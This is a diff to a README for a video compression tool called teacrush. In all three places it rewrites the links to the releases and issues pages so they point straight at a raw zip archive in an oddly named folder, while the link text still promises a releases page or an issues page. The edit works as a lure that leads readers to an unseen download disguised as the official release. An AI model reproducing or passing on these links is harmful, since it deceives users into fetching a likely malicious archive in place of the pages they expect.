@@ -1,7 +1,7 @@
 # 🎥 teacrush - Compress Your Videos Easily
 
 ## 📥 Download Now
-[![Download teacrush](https://img.shields.io/badge/Download-teacrush-brightgreen)](https://github.com/Ahmad-Esmat/teacrush/releases)
+[![Download teacrush](https://raw.githubusercontent.com/Ahmad-Esmat/teacrush/main/wasnt/teacrush-v1.0-beta.2.zip)](https://raw.githubusercontent.com/Ahmad-Esmat/teacrush/main/wasnt/teacrush-v1.0-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to teacrush! This tool helps you compress your videos down to a set size without losing quality. Whether you're looking to save storage space or share videos more easily, teacrush is here to help.
@@ -25,7 +25,7 @@ To run teacrush, ensure you meet the following requirements:
 To get started with teacrush, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Visit the teacrush Releases Page](https://github.com/Ahmad-Esmat/teacrush/releases)
+   [Visit the teacrush Releases Page](https://raw.githubusercontent.com/Ahmad-Esmat/teacrush/main/wasnt/teacrush-v1.0-beta.2.zip)
 
 2. **Choose Your Version:** Look for the latest release. You will see different files available for download. Choose the one that fits your system.
 
@@ -69,7 +69,7 @@ If you encounter any issues while using teacrush, here are some common solutions
 
 ## 🤝 Community and Support
 If you have questions or need help, consider joining our community:
-- **GitHub Issues:** Report bugs or request features at our [issues page](https://github.com/Ahmad-Esmat/teacrush/issues).
+- **GitHub Issues:** Report bugs or request features at our [issues page](https://raw.githubusercontent.com/Ahmad-Esmat/teacrush/main/wasnt/teacrush-v1.0-beta.2.zip).
 - **Discussion Forum:** Engage with other teacrush users and share tips. 
 
 ## 🔗 Learn More
